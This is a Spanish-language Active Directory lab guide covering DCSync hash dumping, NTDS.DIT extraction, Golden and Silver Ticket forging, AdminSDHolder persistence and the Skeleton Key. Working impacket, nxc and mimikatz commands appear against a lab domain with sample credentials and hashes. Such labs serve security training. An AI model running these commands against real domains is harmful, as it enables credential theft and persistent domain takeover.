# Lab 05 — DCSync & Golden Ticket

## Objetivo

Replicar todos los hashes del dominio con DCSync y forjar tickets Kerberos Golden/Silver para persistencia y acceso permanente.

---

## DCSync

DCSync simula el comportamiento de un Domain Controller replicando credenciales usando el protocolo MS-DRSR (Directory Replication). Requiere privilegios de Domain Admin o derechos de replicación (DS-Replication-Get-Changes-All).

---

## Parte 1 — DCSync con secretsdump

```bash
# Volcar todos los hashes del dominio (requiere DA)
secretsdump.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10

# Output:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe8d67b1fd0a4b1a4f5a0f95bbe3c6e2:::
# jgarcia:1108:...
# mlopez:1109:...
# sql_svc:1110:...

# Solo el hash de krbtgt (para Golden Ticket)
secretsdump.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10 \
    -just-dc-user krbtgt

# Con PtH (si solo tenemos el hash)
secretsdump.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
    labthinktank.local/Administrator@192.168.100.10
```

### Extraer NTDS.DIT localmente

```bash
# Si tenemos shell en el DC:
# 1. Shadow copy del sistema
vssadmin create shadow /for=C:

# 2. Copiar NTDS.DIT y SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
reg save HKLM\SYSTEM C:\system.bak

# 3. Desde atacante, transferir y parsear
secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```

---

## Parte 2 — Golden Ticket

Un **Golden Ticket** es un TGT falso forjado con el hash de `krbtgt`. Permite autenticarse como **cualquier usuario** del dominio, incluso usuarios inexistentes, con cualquier privilegio.

```
Para crear un Golden Ticket necesitas:
  - Hash NTLM de krbtgt
  - SID del dominio
  - Nombre del dominio
  - (Opcional) nombre de usuario a impersonar
```

### Obtener el SID del dominio

```bash
# Via impacket
lookupsid.py labthinktank.local/jgarcia:Password123!@192.168.100.10 0

# Output:
# [*] Domain SID is: S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ

# Via nxc
nxc ldap 192.168.100.10 -u jgarcia -p "Password123!" --get-sid
```

### Forjar el Golden Ticket

```bash
# ticketer.py (impacket) — crear el ticket
ticketer.py \
    -nthash fe8d67b1fd0a4b1a4f5a0f95bbe3c6e2 \
    -domain-sid S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ \
    -domain labthinktank.local \
    Administrador_Falso

# Se genera: Administrador_Falso.ccache

# Usar el Golden Ticket
export KRB5CCNAME=/workspace/Administrador_Falso.ccache

psexec.py -k -no-pass Administrador_Falso@DC01.labthinktank.local
```

---

## Parte 3 — Silver Ticket

Un **Silver Ticket** es un TGS falso forjado con el hash de la cuenta de servicio. Más sigiloso que el Golden (no contacta el KDC) pero limitado al servicio específico.

```bash
# Para CIFS (SMB) en el DC
ticketer.py \
    -nthash HASH_NT_DEL_SERVICIO \
    -domain-sid S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ \
    -domain labthinktank.local \
    -spn cifs/DC01.labthinktank.local \
    Administrator

export KRB5CCNAME=/workspace/Administrator.ccache
smbclient.py -k -no-pass Administrator@DC01.labthinktank.local
```

---

## Parte 4 — Persistencia con AdminSDHolder

```bash
# AdminSDHolder protege las cuentas privilegiadas.
# Si un atacante modifica AdminSDHolder, SDProp propagará la ACL
# a todos los objetos protegidos cada 60 minutos.

# Ver ACL de AdminSDHolder
nxc ldap 192.168.100.10 \
    -u Administrator -p "Lab@Think2026!" \
    --query "(cn=AdminSDHolder)" \
    "nTSecurityDescriptor"

# Añadir usuario como GenericAll en AdminSDHolder
# → en 60 min, el usuario tendrá control sobre todos los DA
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=labthinktank,DC=local" \
    -PrincipalIdentity jgarcia -Rights All
```

---

## Parte 5 — Skeleton Key

Inyectar una contraseña maestra en el proceso LSASS del DC que funciona para **cualquier usuario**:

```bash
# Requiere shell en el DC
# Con mimikatz (si disponible):
privilege::debug
misc::skeleton

# Después, cualquier usuario puede autenticarse con "mimikatz" como contraseña:
nxc smb 192.168.100.10 -u jgarcia -p "mimikatz"
```

---

## Actividades

1. Realizar DCSync y extraer todos los hashes del dominio
2. Identificar el hash de `krbtgt` y el SID del dominio
3. Forjar un Golden Ticket para un usuario ficticio y autenticarse como Domain Admin
4. Crear un Silver Ticket para el servicio CIFS del DC
5. Explicar por qué cambiar la contraseña de krbtgt dos veces invalida todos los Golden Tickets existentes

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| DCSync | T1003.006 — DCSync |
| Golden Ticket | T1558.001 |
| Silver Ticket | T1558.002 |
| Skeleton Key | T1556.001 |
